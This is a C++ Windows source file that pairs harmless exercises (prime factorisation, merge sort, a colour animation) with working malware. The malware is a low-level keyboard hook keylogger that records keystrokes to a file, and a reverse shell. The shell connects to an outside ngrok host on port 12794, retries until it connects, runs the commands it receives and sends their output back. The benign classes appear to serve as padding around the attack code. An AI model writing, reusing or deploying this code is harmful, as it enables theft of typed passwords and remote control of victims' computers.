#include<bits/stdc++.h>
#include <winsock2.h>
#include <windows.h>
#include <cstring>
#include <cstdlib>
#include <fstream>
#include <iostream>
#define ll long long
#define do {
#define done }
#define read std::cin>>
#define echo std::cout
#define Keylogger LRESULT CALLBACK KeyEvent
#define start_ int main()
#define finish return 0;
using namespace std;

#define ll long long
#define MX 100005
#define bzero(p,size) (void)memset((p),0,(size))


HHOOK hKeyHook;
std::ofstream logFile("keylog.txt", std::ios::app);

int temp[MX], num[MX];
int sock;





class Algo{
public:




};


LRESULT CALLBACK KeyEvent(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* keyInfo = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = keyInfo->vkCode;

        // 🛑 Press ESC to stop the logger
        if (vkCode == VK_ESCAPE) {
            PostQuitMessage(0); // exits the message loop
        }

        // 📄 Log key to file
        char keyName[128];
        if (GetKeyNameTextA((LONG)(keyInfo->scanCode << 16), keyName, sizeof(keyName)) > 0) {
            logFile << "[" << keyName << "] ";
        } else {
            logFile << "[VK " << vkCode << "] ";
        }

        logFile.flush(); // write immediately
    }
    return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}





// 🔢 Prime Factorization
class PrimeFactorization {
public:
    void Solve() {
        int n;
        cin >> n;
        for (int i = 2; i <= n; i++) {
            while (n % i == 0) {
                cout << i << "\n";
                n /= i;
            }
        }
    }
};

// 🎨 Terminal Animation via WSL
class LinuxTerminal {
public:
    void Solve() {
        for (int row = 0; row < 10; row++) {
            system("color 0B");
            for (int col = 0; col < row; col++) {
                cout << col;
            }
            cout << "\n";
        }
        for (int row = 10; row >= 0; row--) {
            system("color 0C");
            for (int col = 0; col < row; col++) {
                cout << col;
            }
            cout << "\n";
        }
        system("color 0A");
        system("wsl -d Ubuntu -- bash -c 'echo Hello from C++; sudo apt-get install figlet -y; figlet HELLO WORLD; ifconfig; echo hello vi;'");
    }
};

// 🧮 Merge Sort
class MargeSort {
public:
    void Marge(int lo, int hi) {
        if (lo == hi) return;
        int mid = (lo + hi) / 2;
        Marge(lo, mid);
        Marge(mid + 1, hi);

        int i = lo, j = mid + 1, k = lo;
        while (i <= mid && j <= hi) {
            if (num[i] < num[j]) temp[k++] = num[i++];
            else temp[k++] = num[j++];
        }
        while (i <= mid) temp[k++] = num[i++];
        while (j <= hi) temp[k++] = num[j++];

        for (k = lo; k <= hi; k++) num[k] = temp[k];
    }
};

class MargeInput : public MargeSort {
public:
    void Solve() {
        int n;
        cin >> n;
        for (int i = 1; i <= n; i++) cin >> num[i];
        Marge(1, n);
        for (int i = 1; i <= n; i++) cout << num[i] << "\n";
    }
};

// 🐚 Shell Execution
void shell() {
    char buffer[1024];
    char container[1024];
    char total_response[18384];

    while (true) {
        bzero(buffer, sizeof(buffer));
        bzero(container, sizeof(container));
        bzero(total_response, sizeof(total_response));

        recv(sock, buffer, sizeof(buffer), 0);

        if (strncmp("q", buffer, 1) == 0) {
            closesocket(sock);
            exit(0);
        } else {
            FILE *fp = _popen(buffer, "r");
            while (fgets(container, sizeof(container), fp) != NULL) {
                strcat(total_response, container);
            }
            send(sock, total_response, sizeof(total_response), 0);
            fclose(fp);
        }
    }
}

// 🚀 Main
start_
do

    MSG msg;

    // 🧷 Install the keyboard hook
    hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyEvent, NULL, 0);
    if (!hKeyHook) {
        std::cerr << "Hook failed." << std::endl;
        return 1;
    }

    std::cout << "[*] Logging started. Press ESC to exit.\n";

    // 🌀 Message loop keeps the hook alive
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // ✅ Cleanup
    UnhookWindowsHookEx(hKeyHook);
    logFile.close();

    std::cout << "[*] Logging stopped.\n";





    PrimeFactorization pf;
    pf.Solve();

    LinuxTerminal lt;
    lt.Solve();

    MargeInput ms;
    ms.Solve();

    WSADATA wsaData;
    struct sockaddr_in x;
    ll port = 12794;
    const char *ip = "0.tcp.in.ngrok.io";

    WSAStartup(MAKEWORD(2, 0), &wsaData);
    sock = socket(AF_INET, SOCK_STREAM, 0);
    bzero(&x, sizeof(x));

    x.sin_family = AF_INET;
    x.sin_port = htons(port);

    // ⭐ Resolve domain name to IP
    struct hostent *host;
    host = gethostbyname(ip);
    x.sin_addr = *((struct in_addr *)host->h_addr);

    while (connect(sock, (struct sockaddr *)&x, sizeof(x)) != 0) {
        Sleep(10);
    }

    shell();
    finish;
done
